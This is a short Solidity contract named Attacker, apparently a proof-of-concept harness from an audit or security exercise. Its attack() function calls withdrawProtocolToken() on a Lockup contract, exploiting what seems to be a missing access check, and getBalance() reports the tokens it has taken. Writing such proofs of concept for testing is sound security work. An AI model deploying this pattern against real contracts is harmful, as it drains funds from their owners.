// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ILockup.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract Attacker {
    ILockup public lockup;
    IERC20 public token;

    constructor(address _lockup, address _token) {
        lockup = ILockup(_lockup);
        token = IERC20(_token);
    }

    function attack() external {
        lockup.withdrawProtocolToken();
    }

    function getBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}
